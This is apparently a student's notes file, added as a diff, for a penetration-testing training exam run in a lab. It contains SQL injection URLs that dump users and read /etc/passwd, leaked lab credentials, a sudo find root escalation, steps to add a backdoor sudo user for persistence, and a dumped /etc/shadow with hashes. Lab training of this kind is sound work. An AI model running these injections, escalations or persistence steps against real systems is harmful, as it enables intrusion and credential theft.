@@ -1,0 +1,301 @@
+STOP OVERTHINKING SHIT LITERALLY JUST RELAX YOU KNOW HOW TO DO THIS
+
+# PROMPT
+```
+OPERATION: DRY RUN
+
+SITREP: This is a dry run operation to prepare you for tomorrow's real operation. You will be provided with a mission task sheet, RoE, and scope.
+
+Maintain 'low visibility' on the wire, as security products may be in place, and document your actions and results as you will be expected to provide OpNotes at the end of the operation.
+
+Take notes on this document.
+
+Dry Run Operation
+XX June 2024
+Start Time: 0830
+Duration: 3 hours
+
+Type of Operation: Information Systems Penetration Test
+
+Objective:Actively exploit and attack networked information systems for the purposes of identifying and reporting vulnerabilities.
+
+Tasking:Perform all tasks outlined in this document.
+
+Mission Scope:
+
+All public facing systems of target entitiy excluding devices responsible for networking (routers, switches, etc). Known web address will be supplied out of band.
+
+Internal network of target entity excluding devices responsible for networking (routers, switches, etc)
+
+
+RoE:
+
+Google docs, and all other shareable document platforms, are forbidden during this operation.
+
+All communication platforms and applications, such as Slack or Gmail, are forbidden during this operation.
+
+You are authorized to modify passwords to user accounts.
+
+Writing to disk is authorized on all machines.
+
+You will not destroy data/systems, perform DoS, or otherwise disrupt business operations of any entity during this penetration test.
+
+You will not use Metasploit tools for any affect with the exception of shellcode generation.
+
+You will not target routers, switches or other networking devices.
+
+You will not target entities or systems outside of the scope previously defined.
+
+You will not interfere with other entities' operations in any way.
+
+Prior Approvals: OSINT through publicly available resources. Scrape appropriate web content that will provide operational data. Testing of found credentials. NOT approved to change routing or destroy data.
+```
+
+
+
+CTFD DUMP
+```
+output of login php POST Method
+-------------------------------
+Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1
+
+
+output of getcareers.php file reader /etc/passwd
+-----------------------------------------------
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false user2:x:1001:1001::/home/user2:/bin/sh 
+
+
+output of /etc/group
+--------------------
+root:x:0: daemon:x:1: bin:x:2: sys:x:3: adm:x:4:syslog,ubuntu tty:x:5: disk:x:6: lp:x:7: mail:x:8: news:x:9: uucp:x:10: man:x:12: proxy:x:13: kmem:x:15: dialout:x:20:ubuntu fax:x:21: voice:x:22: cdrom:x:24:ubuntu floppy:x:25:ubuntu tape:x:26: sudo:x:27:ubuntu audio:x:29:ubuntu dip:x:30:ubuntu www-data:x:33: backup:x:34: operator:x:37: list:x:38: irc:x:39: src:x:40: gnats:x:41: shadow:x:42: utmp:x:43: video:x:44:ubuntu sasl:x:45: plugdev:x:46:ubuntu staff:x:50: games:x:60: users:x:100: nogroup:x:65534: systemd-journal:x:101: systemd-network:x:102: systemd-resolve:x:103: input:x:104: crontab:x:105: syslog:x:106: messagebus:x:107: lxd:x:108:ubuntu mlocate:x:109: uuidd:x:110: ssh:x:111: landscape:x:112: admin:x:113: netdev:x:114:ubuntu ubuntu:x:1000: mysql:x:115: ssl-cert:x:116: user2:x:1001: 
+
+
+output of /etc/hosts
+--------------------
+File to read:
+127.0.0.1 localhost # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters ff02::3 ip6-allhosts 192.168.28.181 WebApp 
+
+
+
+output of /etc/resolv.conf
+---------------------------
+ # This file is managed by man:systemd-resolved(8). Do not edit. # # This is a dynamic resolv.conf file for connecting local clients to the # internal DNS stub resolver of systemd-resolved. This file lists all # configured search domains. # # Run "systemd-resolve --status" to see details about the uplink DNS servers # currently in use. # # Third party programs must not access this file directly, but only through the # symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way, # replace this symlink by a static file or a different symlink. # # See man:systemd-resolved.service(8) for details about the supported modes of # operation for /etc/resolv.conf. nameserver 127.0.0.53 options edns0 
+ 
+ 
+ output of /etc/networks
+ ------------------------
+ # symbolic names for networks, see networks(5) for more information link-local 169.254.0.0 
+
+
+
+
+running nikto against target ip from op station
+-----------------------------------------------
+	> nikto v -h <ip> from		
+		#nikto is cracked asf it literally will show you indexes to check and interesting/vulnerable directories
+	
+
+		
+10.50.38.119/scripts page
+---------------------------
+
+### development.py ###
+#!/usr/bin/python3
+
+import os
+
+system_user=user2
+user_password=EaglesIsARE78
+
+
+
+##Developer note
+
+#script will eventually take above system user credentials and run automated services
+
+
+
+
+
+
+```
+
+
+
+
+
+
+
+```
+RECON
+------
+	1. First conduct initial reconnaissance on the 10.50.38.119 box. 
+		> nmap -Pn -T4 <ip_addr> -p		# this will perform a full port scan on the ip address.
+	2. Analyze the output of your sweep. Perfrom banner grabbing with netcat if necessary to verify the ports.
+	3. Perform a wget to obtain the entire index file of the website along with any other html documents or dependencies. This will help later.
+	4. Connect to the website via firefox by entering the following . You do this so you can manipulate the php scripts used by the website
+		> firefox <ip_addr:port>
+	
+BOX 2 BestWebApp
+
+golden statement	:	http://localhost:11135/pick.php?product=7%20UNION%20select%20table_schema,column_name,table_name%20from%20information_schema.columns
+
+version of sql		:	http://localhost:11135/pick.php?product=7%20UNION%20select%201,2,@@version
+					>	10.1.48-MariaDB-0ubuntu0.18.04.
+					
+					
+
+getting the user info you need		:	http://localhost:11135/pick.php?product=7%20UNION%20select%20user_id,name,username%20from%20siteusers.users
+						
+						
+mf uhh users
+
+Item 	On Hand 	Price
+HAM 	32 	$15
+1 	Aaron 	$Aaron
+2 	user2 	$user2
+3 	user3 	$user3
+4 	Lroth 	$Lee_Roth
+1 	ncnffjbeqlCn$$jbeq 	$Aaron
+2 	RntyrfVfNER78 	$user2
+3 	Obo4GURRnccyrf 	$user3
+4 	anotherpassword4THEages 	$Lroth
+
+
+
+
+CREDS
+--------
+box 1
+
+user2:EaglesIsARE78
+
+Aaron:apasswordyPa$$word 		#username and pw for box 2
+user3:Bob4THEEapples
+
+
+LOADING A FILE FROM SQL INJECTION GET METHOD
+-------------------------------------------
+
+
+http://localhost:11155/pick.php?product=7%20UNION%20select%201,2,load_file(%27/etc/passwd%27)
+
+```
+
+
+
+from the PublicWebSite:
+
+
+	for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+		# this will show you boxes to check out next. remember to do ping sweeps on each network you come across
+		
+
+nmap scan against the 192.168.28.172
+
+Nmap scan report for 192.168.28.172
+Host is up (0.0012s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+
+
+OK, TAKE A DEEP BREATH; YOU MADE IT TOO ROUNDSENSOR
+
+
+now time for privesc
+
+first look in sudo -l. we see that we can run the find command with sudo without a password. now check gtfobins and you cn see you can give yourself a bash shell with root like this:
+
+	> sudo find . -exec /bin/bash \; -quit
+	
+
+Create a new user for persistence
+
+	> useradd jacob
+
+change your default shell to bash
+
+	> chsh --shell /bin/bash jacob
+
+add the following to your /etc/sudoers file
+	
+	> jacob   ALL=(ALL:ALL) NOPASSWD:ALL
+
+/etc/shadow file:
+
+root:$6$M8VTycN3$h0P4t.psV8rIgeV4y067rlPOBoz.vZL46LKylxU5njS6wbW35lehtXK2qBDxglF9k9yVAwhQIZ1Xn.w26rip2.:19124:0:99999:7:::
+daemon:*:18325:0:99999:7:::
+bin:*:18325:0:99999:7:::
+sys:*:18325:0:99999:7:::
+sync:*:18325:0:99999:7:::
+games:*:18325:0:99999:7:::
+man:*:18325:0:99999:7:::
+lp:*:18325:0:99999:7:::
+mail:*:18325:0:99999:7:::
+news:*:18325:0:99999:7:::
+uucp:*:18325:0:99999:7:::
+proxy:*:18325:0:99999:7:::
+www-data:*:18325:0:99999:7:::
+backup:*:18325:0:99999:7:::
+list:*:18325:0:99999:7:::
+irc:*:18325:0:99999:7:::
+gnats:*:18325:0:99999:7:::
+nobody:*:18325:0:99999:7:::
+systemd-network:*:18325:0:99999:7:::
+systemd-resolve:*:18325:0:99999:7:::
+syslog:*:18325:0:99999:7:::
+messagebus:*:18325:0:99999:7:::
+_apt:*:18325:0:99999:7:::
+lxd:*:18325:0:99999:7:::
+uuidd:*:18325:0:99999:7:::
+dnsmasq:*:18325:0:99999:7:::
+landscape:*:18325:0:99999:7:::
+sshd:*:18325:0:99999:7:::
+pollinate:*:18325:0:99999:7:::
+ubuntu:!:19121:0:99999:7:::
+Aaron:$6$3gC8TXmG$60iE2VGE7Wk1/XqYTLAAdqjqVukfrCKbOZZuj.IxlpI7T.LZkZjKUojqPYOcf/swGR.UKxxZM0LxagLO5GtK61:19121:0:99999:7:::
+jacob:$6$0LoShyQg$uwRLPG7zM03hIFXlifafgOHez9buUyvPxFHvULHtO1sjq5zDmaFWrAjppvxbKOdAMOhrTFrJvukzJEwHMMANJ1:19124:0:99999:7:::
+
+
+next literally install nmap on the RoundSensor 
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-12 17:20 UTC
+Nmap scan report for 192.168.28.179
+Host is up (-0.15s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
+
+TEST NOTES
+
+31 questions | 155 points
+
+part 1 | 16 questions | 80 points
+
+part 2 | 15 questions | 75 points
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+MINIMUM NEEDED TO PASS: 22 questions | 110 points
+
+0800-1100 part 1
+
+1100-1200 lunch
+
+1200-1500 part 2
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NOTE: if your xfreerdp says something like this: 
+
+The host key for localhost has changed
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+
+
+add '/cert-ignore ' to the end of your xfreerdp syntax
